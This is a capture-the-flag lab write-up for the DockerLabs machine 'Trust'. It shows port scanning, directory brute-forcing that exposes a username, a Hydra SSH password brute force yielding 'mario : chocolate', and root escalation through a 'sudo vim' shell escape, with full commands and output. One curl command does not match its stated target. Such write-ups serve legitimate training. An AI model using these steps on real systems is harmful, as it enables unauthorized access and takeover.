![](adjuntos/Pasted%20image%2020260220022625.png)

# Trust – DockerLabs

> Compromise of a Docker-based environment through web enumeration, discovery of valid SSH credentials via brute force, and privilege escalation to root by exploiting a misconfigured `sudo` rule (`vim` – GTFOBins).

---

## 1️⃣ Lab Information

- **Platform:** DockerLabs
- **Environment Type:** Docker container
- **Target Services:** Apache 2.4.57 (Debian) + OpenSSH 9.2p1
- **Exploited Vulnerability:** Weak SSH credentials + insecure `sudo` configuration (execution of `vim` as root – GTFOBins abuse)
- **Difficulty:** Easy–Medium

### Demonstrated Skills

- Full service enumeration (Nmap)
- Hidden resource discovery (Gobuster)
- Manual analysis of web endpoints (`secret.php`)
- Identification of valid system user from web artifact
- Targeted SSH brute-force attack using Hydra
- Interactive access via SSH
- Privilege enumeration with `sudo -l`
- Privilege escalation through abuse of allowed binaries (GTFOBins – `vim`)
- Full system compromise validation (root access)

## 🐳 2️⃣ Deployment

The machine was deployed as a Docker container using the provided script:

```bash
sudo bash auto_deploy.sh trust.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.18.0.2
```

## 🔎 3️⃣ Enumeration

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.18.0.2 escaneo
```
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
```

## 4️⃣ Analysis

The scan identified two exposed services:
- **22/tcp → SSH (OpenSSH 9.2p1)**
- **80/tcp → HTTP (Apache 2.4.57 – Debian)**

Accessing the target via IP (`172.18.0.2`) displayed only the default Apache landing page (_Apache2 Debian Default Page – It works_), indicating no visible CMS or application at the root directory.

Directory brute-force enumeration was conducted, revealing a hidden resource:

- `/secret.php` → `200 OK`

Accessing this endpoint exposed dynamic content containing a direct reference to a potential system user (**“Mario”**).

 At this stage, the HTTP service was treated as the primary attack surface for intelligence gathering, enabling a pivot toward SSH as the initial access vector.

## 5️⃣ Identification of the Initial Access Vector

After confirming that the web root only exposed the default Apache page, advanced resource enumeration was performed.

### 5.1 Directory Enumeration
After confirming that the web root only exposed the default Apache page, advanced enumeration of hidden resources was conducted.

```bas
gobuster dir -u http://172.18.0.2/ \
-w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
-x php,txt,html
```

Relevant results:
```bash
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882236 / 882240 (100.00%)
===============================================================
Finished
===============================================================
```

The discovery of `/secret.php` indicated additional attack surface not linked from the main page.

### 5.2 Manual Inspection of Discovered Resource
```bash
/secret.php           (Status: 200) [Size: 927]
```
The resource can be inspected either by using **curl** or by directly accessing `http://172.18.0.2/secret.php` through a web browser:
```bash
 curl http://172.18.0.2/index.html
```
```bash
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Secreto!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hola Mario,</h1>
        <p>Esta web no se puede hackear.</p>
    </div>
</body>
</html>
```
- http://172.18.0.2/secret.php :

![](adjuntos/Pasted%20image%2020260220030009.png)


## 6️⃣ Exploitation

With the username `mario` identified and SSH exposed, a targeted brute-force attack was executed against port 22.
```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -t 5 ssh
```

Relevant output:
```bash
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-20 03:04:20
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.18.0.2:22/
[22][ssh] host: 172.18.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-20 03:05:14
```

Valid credentials obtained:

```bash
mario : chocolate
```

## 7️⃣ Access Validation (Post-Exploitation)

Once valid credentials were obtained, an SSH connection was established to the target system to gain authenticated access.
```bash
ssh mario@172.18.0.2
```
```bash
mario@172.18.0.2's password: 
Linux 099195da51ae 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@099195da51ae:~$ whoami
mario
mario@099195da51ae:~$  
```

## 8️⃣ Privilege Escalation

After obtaining user-level access, sudo privileges were enumerated:

```bash
sudo -l
```

Output:
```bash
Matching Defaults entries for mario on 099195da51ae:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 099195da51ae:
    (ALL) /usr/bin/vim
```

The user was permitted to execute `/usr/bin/vim` with elevated privileges.

### Exploitation Method Identification

The [GTFOBins](https://gtfobins.org/) reference confirmed that `vim` allows shell escape when executed with elevated privileges.

Privilege escalation was achieved using:
```bash
sudo vim -c ':!/bin/bash'
```
Resulting shell:
```bash
:!/bin/bash
root@099195da51ae:/home/mario# whoami
root
root@099195da51ae:/home/mario#
```

Root-level access was successfully obtained.

## 🏁 Conclusion
This lab demonstrates how proper enumeration can escalate minimal web exposure into full system compromise.

A hidden endpoint revealed a valid user, weak SSH credentials enabled access, and a misconfigured `sudo` rule allowed privilege escalation via `vim`, resulting in root access.

The scenario highlights the impact of weak authentication and improper privilege management in Unix-based environments.